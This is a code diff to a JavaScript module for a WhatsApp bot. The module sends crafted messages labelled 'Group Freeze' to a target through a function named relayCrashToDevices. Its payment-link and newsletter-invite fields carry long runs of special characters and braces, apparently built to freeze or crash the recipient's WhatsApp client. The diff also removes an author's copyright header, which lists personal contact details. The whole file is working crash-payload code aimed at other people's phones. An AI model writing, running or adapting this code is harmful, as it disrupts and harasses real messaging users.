@@ -1,49 +1,22 @@
 const { relayCrashToDevices } = require('../target-utils');
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 async function xgcs(SYxS7, target) {
-    const msg = generateWAMessageFromContent(target, {
+    const msg = {
         extendedTextMessage: {
-            text: "",
+            text: "Group Freeze " + "ꦾ".repeat(1000),
             matchedText: "https://t.me/devor6core",
             description: "",
-            title: "",
+            title: "Group Freeze",
             paymentLinkMetadata: {
-                button: { displayText: "" },
+                button: { displayText: "JOIN" },
                 header: { headerType: 1 },
-                provider: { paramsJson: "{{".repeat(5000) }
+                provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
             },
             linkPreviewMetadata: {
                 paymentLinkMetadata: {
-                    button: { displayText: "" },
+                    button: { displayText: "JOIN" },
                     header: { headerType: 1 },
-                    provider: { paramsJson: "{{".repeat(5000) }
+                    provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
                 },
                 urlMetadata: { fbExperimentId: 999 },
                 fbExperimentId: 888,
@@ -51,21 +24,19 @@ async function xgcs(SYxS7, target) {
                 socialMediaPostType: 1221
             }
         }
-    }, {
-        additionalAttributes: { edit: "7" }
-    });
+    };
 
     try {
-        await relayCrashToDevices(SYxS7, target, {
+        return await relayCrashToDevices(SYxS7, target, {
             groupStatusMessageV2: {
-                message: msg.message
+                message: msg
             }
         });
     } catch (error) {
         console.log(`[ 🗑️ ] Error on message: ${error.message}`);
+        return { success: false, deliveredCount: 0, errors: [error.message] };
     }
 }
-
 
 async function xgc(sam, target) {
     try {
@@ -74,20 +45,19 @@ async function xgc(sam, target) {
                 message: {
                     newsletterAdminInviteMessage: {
                         newsletterJid: '33333333333333333@newsletter',
-                        newsletterName: "Tere hakimu Chachi Ko paku" + "ꦾ".repeat(120000),
+                        newsletterName: "Group Freeze " + "ꦾ".repeat(2000),
                         jpegThumbnail: null,
-                        caption: "ꦽ".repeat(120000),
+                        caption: "ꦽ".repeat(2000),
                         inviteExpiration: Date.now() + 1814400000,
                     },
                 },
             },
         };
-        await relayCrashToDevices(sam, target, messsage);
-    }
-    catch (err) {
+        return await relayCrashToDevices(sam, target, messsage);
+    } catch (err) {
         console.log(err);
+        return { success: false, deliveredCount: 0, errors: [err.message] };
     }
 }
-
 
 module.exports = { gcFrz: xgcs, xgcs, xgc };
